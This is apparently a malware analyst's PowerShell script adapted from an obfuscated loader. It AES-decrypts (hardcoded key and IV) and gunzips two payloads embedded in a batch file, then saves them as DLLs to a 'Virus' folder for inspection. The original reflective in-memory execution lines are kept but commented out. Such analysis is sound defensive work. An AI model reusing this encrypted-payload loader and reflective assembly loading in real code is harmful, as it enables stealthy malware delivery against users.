function Decrypt($data) {
    $aes = [System.Security.Cryptography.Aes]::Create();
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
    $aes.Key = [System.Convert]::FromBase64String('ZY0AiRBAUzXwiLMSsanqMNYvPpDUeepI9OHhL8Z94FE=');
    $aes.IV = [System.Convert]::FromBase64String('+BaV3jm3t+pwr03jFJ8GQA==');
    
    $decryptor = $aes.CreateDecryptor();
    
    $decryptData = $decryptor.TransformFinalBlock($data, 0, $data.Length);
    
    $decryptor.Dispose();
    $aes.Dispose();
    
    $decryptData;
}

function Decompress($data) {
    $stream = New-Object System.IO.MemoryStream(, $data);
    $decompressStream = New-Object System.IO.Compression.GZipStream($stream, [IO.Compression.CompressionMode]::Decompress);
    
    $result = New-Object System.IO.MemoryStream;
    $decompressStream.CopyTo($result);
    $decompressStream.Dispose();
    
    $stream.Dispose();
    $result.Dispose();
    
    $result.ToArray();
}

#$iWaBb = [System.IO.File]::ReadLines([System.IO.Path]::ChangeExtension([System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName, $null));
$iWaBb = [System.IO.File]::ReadLines([System.IO.Path]::ChangeExtension("D:\Network5540Man.cmd.exe", $null));

$xlukS = Decompress(Decrypt([Convert]::FromBase64String([System.Linq.Enumerable]::ElementAt($iWaBb, 5).Substring(2))));
    
$npvtk = Decompress(Decrypt([Convert]::FromBase64String([System.Linq.Enumerable]::ElementAt($iWaBb, 6).Substring(2))));


# 看看是什么b东西
[System.IO.File]::WriteAllBytes("E:/Virus/xlukS.dll", [byte[]]$xlukS);
[System.IO.File]::WriteAllBytes("E:/Virus/npvtk.dll", [byte[]]$npvtk);

#[System.Reflection.Assembly]::Load([byte[]]$npvtk).EntryPoint.Invoke($null, $null);
#[System.Reflection.Assembly]::Load([byte[]]$xlukS).EntryPoint.Invoke($null, $null);
